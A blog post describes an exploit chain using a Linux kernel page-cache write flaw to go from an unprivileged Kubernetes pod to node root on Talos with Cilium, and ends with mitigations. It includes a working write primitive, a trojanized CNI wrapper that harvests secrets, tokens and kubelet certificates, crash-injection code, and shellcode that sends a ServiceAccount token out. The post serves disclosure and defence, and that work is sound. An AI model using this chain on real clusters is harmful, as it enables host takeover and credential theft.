---
title: "Copy Fail: From Unprivileged Pod to Kubernetes Node Root"
date: 2026-05-01T10:00:00+02:00
slug: copyfail-cve-2026-31431-kubernetes-escape
cover:
  image: /images/2026/05-copyfail/copyfail-escape.png
tags: [kubernetes, security, cve, linux, talos, cilium, container-escape]
---

> This article covers two complementary paths: the CNI wrapper staging chain, and the fully autonomous operator-SA compromise that eliminates the external trigger dependency. Both are proven on Talos Linux v1.12.4, Cilium v1.18.x, kernel 6.18.9.
>
> **Update (May 5th):** code and building blocks on GitHub: <https://github.com/clementnuss/copyfail-cve-exploits>

## Context

I work at [PostFinance](https://www.postfinance.ch), where we run a
Kubernetes platform supporting banking workloads. Our production clusters run
Debian 12 with kernel 6.1.158+, which happens to be **not vulnerable** to
CVE-2026-31431 (more on that at the end).

A disclaimer: I'm not a security researcher. I'm a Kubernetes and Linux
systems engineer. I dived into the Copy Fail CVE for about 18 hours straight
to learn new stuff and understand how bad it really was. There might be a flaw
in my exploit chain, but I'm fairly confident it works.

When the CVE [dropped publicly](https://copy.fail) on April 29, I set out to
answer a question: **what does it take to go from an unprivileged pod to full
node root on a vulnerable Kubernetes cluster?**

The answer: stage the entire attack in under a second, then wait for the
target pod to restart. Everything except the restart trigger is fully
unprivileged and instantaneous.

**Update (May 5th, 2026):** I went further. The autonomously-achieved path
is now covered in this article: by corrupting the `cilium-operator` (not the
agent) via the same page cache primitive, we can extract its ServiceAccount
token and gain cluster-wide secret access — enough to trigger pod eviction
ourselves. The CNI-wrapper staging chain remains valid as the simpler (but
externally-dependent) path. Both are discussed below.

The entire exploit development — from understanding the primitive to writing
the C wrapper and staging the attack chain — was done with heavy use of
[OpenCode](https://github.com/anomalyco/opencode)/Claude Code with Claude as
a pair-programming partner. This article was also co-written that way.

Lab target: Talos Linux v1.12.4, kernel 6.18.9, Cilium v1.18.6 as CNI.

## The Vulnerability in 30 Seconds

[CVE-2026-31431](https://copy.fail) ("Copy Fail") is a logic flaw in the
Linux kernel's `AF_ALG` socket interface combined with `authencesn` (the AEAD
template for IPsec extended sequence numbers).

The result: **write 4 arbitrary bytes into the page cache of any readable
file**, without write permissions, without race conditions, in under 1 second.
The page cache change is invisible to on-disk checksums.

The core primitive in Python:

```python
def write_4bytes(fd, offset, data):
    assert len(data) == 4
    conn, h = make_conn()  # AF_ALG + authencesn(hmac(sha256),cbc(aes))
    count = offset + 4
    conn.sendmsg(
        [b"A" * 4 + data],
        [(h, 3, b'\x00' * 4), (h, 2, b'\x10' + b'\x00' * 19), (h, 4, b'\x08' + b'\x00' * 3)],
        32768,
    )
    r, w = os.pipe()
    os.splice(fd, w, count, offset_src=0)  # page cache pages enter pipe
    os.splice(r, conn.fileno(), count)      # pipe → AF_ALG TX SGL
    try:
        conn.recv(8 + offset)  # triggers authencesn decrypt → OOB write
    except Exception:
        pass
    os.close(r); os.close(w); conn.close()
```

Full technical details at the
[Xint writeup](https://xint.io/blog/copy-fail-linux-distributions).

## Key Insight: Page Cache is Shared Across Containers

The Linux page cache is **not namespaced**. All containers using the same OCI
image layer share the same overlayfs lower-layer inodes — and therefore the
same kernel page cache entries.

This means: an unprivileged pod based on the Cilium image can corrupt any
readable file in that image, and the Cilium DaemonSet pod on the same node
will see the corrupted content when it next reads that file.

No write permission needed. No privilege required. Just `open(path, O_RDONLY)`
and the write primitive.

## The Strategy: Hijacking CNI Initialization

With a page cache write primitive and shared image layers, the attack plan
becomes:

1. **Corrupt a script** that runs during Cilium's initialization — specifically
   `install-plugin.sh`, which copies the CNI binary to the host.
2. **Make it install our binary instead** — a small static executable that
   impersonates the real CNI plugin.
3. **Wait for kubelet to call it.** In Kubernetes, the CNI binary is invoked
   by kubelet as root on every pod lifecycle event (create, delete). This is by
   design — [I wrote about this mechanism in 2021](/kubernetes-cni-deconstructed).
   Kubelet doesn't verify the binary's integrity; whatever sits at
   `/opt/cni/bin/cilium-cni` gets executed with full host privileges.
4. **Our binary does its work, then calls the real one.** It harvests
   credentials from the host filesystem, writes them to a volume we can read,
   then transparently `execv()`s the original CNI binary so nothing breaks.

In short: we stage code injection into Cilium's init process via page cache
corruption. The next time the pod is recreated (for any reason), the modified
init script installs a trojanized CNI binary on the host. Kubelet then becomes
our unwitting executor.

## Choosing a Target

The exploit needs a privileged DaemonSet whose container image we can reuse as
a base layer. We chose **Cilium** — not because it's uniquely flawed, but
because it runs on a huge number of clusters and its init containers execute
scripts with host-level volume mounts. Any DaemonSet with similar properties
would work.

**Cilium is not to blame here.** It's a well-designed CNI that happens to have
the properties we need: a shared base image, an init container that runs
scripts from the image, and host-writable volumes. The real bug is in the
kernel.

Finding the target image is easy: `node.status.images[]` in the Kubernetes API
lists every image pulled on a node. Match that against DaemonSet pod specs to
identify shared layers.

## Building the Attack Pod

We build a container image `FROM` the exact same Cilium image. On top, we add
a Python interpreter from
[`python-build-standalone`](https://github.com/astral-sh/python-build-standalone)
(a fully static, relocatable CPython build) plus our exploit script and the
pre-compiled wrapper binary. That's our attack pod — it shares overlayfs layers
with Cilium but has a Python runtime to drive the exploit.

## The Attack Chain

1. **Deploy the attack pod** on the same node as the Cilium DaemonSet. Because
   it uses the same base image, containerd's snapshotter shares the lower
   overlayfs layers — and therefore the same page cache pages.

2. **Stage a static ELF wrapper** (25KB, musl-linked) into the page cache of
   `/opt/cni/bin/cilium-cni`. The file is 68MB; we overwrite only the first
   25KB. The rest doesn't matter — we'll use `dd` with a byte count to extract
   just the wrapper later.

3. **Patch `install-plugin.sh`** — a bash script run by Cilium's init
   container. We overwrite a 219-byte function body (offsets 308-526) with:

   ```bash
   d="${CNI_DIR}/bin/$(basename $1)"
   [ -s "$d.real" ]&&[ $(wc -c<"$d.real") -gt 99999 ]||mv "$d" "$d.real" 2>&-
   dd if=$1 of=$d bs=1 count=25720 2>&-
   chmod +x "$d"
   }
   ```

   This renames the real CNI binary to `.real`, extracts our wrapper from the
   image file via `dd`, and makes it executable.

4. **Wait for Cilium pod recreation** — a node drain or pod eviction causes
   init containers to re-run
   ([details below](#triggering-the-pod-restart)). The attacker cannot trigger
   this from within the pod.

5. **Init container executes the modified script** — our wrapper binary lands
   on the host at `/opt/cni/bin/cilium-cni`.

6. **Kubelet calls the wrapper as root** on the next pod lifecycle event
   (any pod creation/deletion on the node triggers a CNI call). More on
   how the wrapper works below.

7. **Collect the loot.** The wrapper extracts everything it can reach —
   all pod secrets and SA tokens, the kubelet client certificate, and even
   the Talos STATE partition contents (cluster CA key, etcd CA key, machine
   config). It exfiltrates by simply writing files into
   `/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~empty-dir/exfil-sandbox`
   — our attack pod's emptyDir volume, located by scanning pod directories
   for the volume name. Back in the attack pod, the results appear at
   `/sandbox/`:

   ```
   bash-5.3# ls /sandbox
   cmd              cmd.done         cmd.out          kubelet-certs
   mount_state.log  secrets          talos-state      tokens

   bash-5.3# ls /sandbox/talos-state/
   config.yaml            encryption-salt.yaml
   node-identity.yaml     platform-network.yaml

   bash-5.3# ls /sandbox/secrets/
   53680b44-...  693738c5-...  7c7584c7-...
   af3e7b5d-...  d022029f-...  e28b5847-...

   bash-5.3# ls /sandbox/secrets/53680b44-.../cloud-credentials/
   AccessKeyId      SecretAccessKey   UserName
   CreateDate       Status            default
   ```

   Talos `config.yaml` contains the cluster CA private key, etcd CA key, and
   SA signing key — that's total cluster compromise.

## The CNI Wrapper Binary

A "wrapper" in this context means: a binary that **replaces** the real CNI
plugin (`cilium-cni`), does something malicious, then calls the original
binary (renamed to `cilium-cni.real`) so kubelet gets a valid response. From
the outside, everything looks normal.

This technique is the same idea I described in my
[2021 article on CNI deconstructed](/kubernetes-cni-deconstructed): kubelet
calls the CNI binary as root for every pod lifecycle event (`ADD`, `DEL`,
`CHECK`), passing network configuration on stdin and environment variables.
We slip our own binary in place of the real one.

The wrapper is a 25KB static C binary (musl-linked, stripped). The core
logic:

```c
int main(int argc, char *argv[]) {
    char sandbox[512];
    if (find_sandbox(sandbox, sizeof(sandbox))) {
        dump_secrets(sandbox);    // all pod secrets on this node
        dump_tokens(sandbox);     // all SA tokens
        dump_kubelet_certs(sandbox); // /var/lib/kubelet/pki/*
        run_cmd(sandbox);         // execute staged binary if present
    }
    /* Transparently exec the real CNI binary */
    char real_path[260];
    snprintf(real_path, sizeof(real_path), "%s.real", argv[0]);
    execv(real_path, argv);
    return 1;
}
```

When kubelet invokes it:

1. **Locate the exfiltration sandbox** — scans
   `/var/lib/kubelet/pods/*/volumes/kubernetes.io~empty-dir/exfil-sandbox`
   to find our attack pod's emptyDir volume.

2. **Harvest credentials:**
   - Kubelet client certificates from `/var/lib/kubelet/pki/`
   - ServiceAccount tokens from every pod's projected volume
   - All mounted secrets (`kubernetes.io~secret` volumes) from every pod

3. **Execute a staged command** — if a `cmd` binary exists in the sandbox,
   fork+exec it and capture output. This gives us arbitrary code execution as
   host root, triggered remotely by dropping a binary into the emptyDir.

4. **`execv()` the real CNI binary** (`argv[0] + ".real"`) — the original
   `cilium-cni` runs transparently. Kubelet sees a normal CNI response.
   Nothing breaks, nothing logs an error.

Kubelet doesn't verify the CNI binary's integrity. Whatever sits at
`/opt/cni/bin/cilium-cni` gets executed as root, with full host filesystem
access, on every single pod event on that node.

## Why Talos Made This Harder

Talos Linux is designed to be minimal and immutable. This made the exploit
chain significantly more difficult:

- **No shell on the host.** `/bin/sh`, `/bin/bash` — none of them exist.
  Shell script wrappers fail with `fork/exec: no such file or directory`. Our
  CNI wrapper had to be a fully static ELF binary.

- **No package manager in the Cilium image.** The Wolfi-based Cilium image
  has no `apk`. We had to bundle a static Python via
  `python-build-standalone` to get an interpreter at all.

- **Static binary size matters.** A Go binary compiled to 1.2MB — too large
  for the write primitive. Plain C with musl: 25KB. That's 6,430 `write4`
  calls — under 1 second.

## Triggering the Pod Restart

The exploit requires Cilium's **init containers** to re-run after the page
cache is corrupted. This means the Cilium **pod** must be recreated — not
merely restarted. This distinction matters: when a container crashes and
kubelet restarts it, init containers do **not** re-run. Only full pod
recreation (deletion + DaemonSet controller creating a new pod) triggers init
containers again.

### Crash ≠ Restart

My first idea was to crash `cilium-agent` by corrupting its binary in the
page cache. Flipping random bytes in a Go binary might cause silent
misbehavior or a hang — we need a **guaranteed, immediate crash**. x86 has
the right tool: the `UD2` instruction (`0F 0B`), a two-byte opcode that
_always_ raises an Invalid Opcode exception. The Linux kernel itself uses it
for `BUG()`. On Linux, `#UD` is delivered as `SIGILL`, which terminates the
process immediately.

We place two `UD2` instructions (`0f 0b 0f 0b`) every 64 bytes across the
`.text` section — a minefield where any code path hits a trap within 64 bytes:

```python
# 16,384 writes per 1MB of .text — takes 0.36 seconds
for off in range(text_start, text_start + window, 64):
    write_4bytes(fd, off, b'\x0f\x0b\x0f\x0b')
```

The agent crashes within milliseconds:

```
SIGILL at PC=0x9a66c0, instruction bytes: 0f 0b 0f 0b 76 12 55 48...
```

Cilium enters `CrashLoopBackOff`. But kubelet only restarts the **container**
— init containers don't re-run, and our modified `install-plugin.sh` never
executes. Restoring the original bytes (another round of `write4` calls) lets
the agent recover cleanly. This confirms that page cache corruption is
**immediately visible** to instruction fetch — a useful property, but not a
restart trigger.

### Autonomous Path: The cilium-operator Token

Crashing the agent confirms the primitive works, but it does not solve the
restart problem. Container restarts do not rerun init containers. We need a way
to **trigger pod eviction from inside the attack chain**.

The `cilium-operator` Deployment runs a different image but shares the same
base layers with the agent. It has a critical property that makes it a better
target than the agent: its ServiceAccount token has **cluster-wide secret read
access**.

| Permission                                   | cilium (agent) SA | cilium-operator SA |
| -------------------------------------------- | ----------------- | ------------------ |
| `get/list/watch` secrets (cluster-wide)      | Yes               | **Yes**            |
| `delete` pods (cluster-wide)                 | No                | **Yes**            |
| `create/update/delete` CiliumNetworkPolicies | No                | **Yes**            |

The operator needs secret access for Ingress/Gateway API TLS watching. That
token is a kubernetes _cluster-admin equivalent_ for data access.

**How we get it:**

The operator binary (`cilium-operator-generic`, 116 MB static Go) is in the
same shared image layer. We use the same entry-point injection approach:

1. **Shellcode at file offset `0x8b820`** — 214 bytes of x86_64 syscalls that
   open `/var/run/secrets/kubernetes.io/serviceaccount/token`, read it, and
   send it via UDP datagram to the attack pod.
2. **Carpet bomb** — 256 UD2 instructions across 1 MB of `.text` to force a
   crash.
3. **Listen** — the operator restarts (or is recreated by the Deployment)
   and runs our shellcode at the (now corrupted) entry point.
4. **Token received** — 1254-byte JWT:

   ```
   [+] RECEIVED 1254 bytes from ('10.127.64.67', 45188)
   [+] SA TOKEN CAPTURED! (1254 bytes)
   [+] Entry point restored: e95bc8ffff
   [+] Operator Running 1/1 (2 restarts total)
   ```

Key detail: the operator image is **distroless** (no shell, no tools). This
forced the shellcode to be raw syscalls rather than a `system("cat ...")`
shortcut, but the approach is identical.

**What the token buys:**

- Read any secret in any namespace (including kube-system bootstrap tokens,
  TLS keys, cloud credentials).
- Delete any pod (including the cilium-agent pod itself — triggering its
  recreation and therefore the init containers).

Once we have the operator token, we can now **delete the cilium-agent pod
ourselves**, forcing the DaemonSet to recreate it. The init containers rerun,
our modified `install-plugin.sh` installs the CNI wrapper, and kubelet invokes
it as root on the next pod event.

This closes the loop: page cache corruption → operator token → pod eviction
→ CNI wrapper → host root. The only "external" event is the operator pod
restart, which is guaranteed by the corrupt-and-restore cycle itself.

## Why PostFinance Is Not Affected

Our production clusters run Debian 12 with kernel `6.1.158-1` and above.

These kernels contain a [backport](https://github.com/gregkh/linux/commit/2b8bbc64b5c2)
of the `af_alg_sendpage()` → `MSG_SPLICE_PAGES` conversion. Due to an
unresolved TODO in the backport, data is **always copied** into fresh kernel
pages rather than passing page cache references zero-copy. The OOB write still
happens, but it lands on copied pages — harmlessly.

This is an accidental mitigation, not the official fix. Kernels >= 6.5
(mainline) properly implement the zero-copy path and are vulnerable again
until the [official patch](https://github.com/torvalds/linux/commit/a664bf3d603d).

Reference: [theori-io/copy-fail-CVE-2026-31431#19](https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/19)

## Mitigation for Affected Clusters

**Patch the kernel.** The fix is mainline commit `a664bf3d603d`. Most distros
are shipping it now.

**Immediate (no reboot):** deploy
[`cozystack/copy-fail-blocker`](https://github.com/cozystack/copy-fail-blocker)
— a BPF-LSM DaemonSet that blocks all `AF_ALG` socket creation cluster-wide:

```bash
kubectl apply -f https://raw.githubusercontent.com/cozystack/copy-fail-blocker/v0.2.1/manifests/copy-fail-blocker.yaml
```

Verify it works from any pod:

```python
import socket
try:
    socket.socket(38, socket.SOCK_SEQPACKET, 0)  # AF_ALG = 38
    print("FAIL: AF_ALG socket created")
except OSError as e:
    print("OK:", e)
# Expected: OK: [Errno 1] Operation not permitted
```

**Note:** RuntimeDefault seccomp does NOT block `AF_ALG`. Pod Security
Standards (even Restricted) do not block the socket path either. You need
either the BPF-LSM blocker, a custom seccomp profile, or the kernel patch.

## Takeaways

- **CNI plugins are a high-value target.** They run as host root with access
  to all kubelet credentials. A single corrupted init script becomes persistent
  host-level code execution.

- **BPF-LSM is the fastest no-reboot mitigation** for kernel-level attack
  surface. `copy-fail-blocker` deploys in seconds and covers every pod on the
  node, regardless of seccomp or PSS configuration.

- **Even "unprivileged" pods can achieve node compromise** if they share an
  image layer with a privileged workload. Consider whether your CNI, CSI, or
  monitoring DaemonSets share base images with tenant workloads..
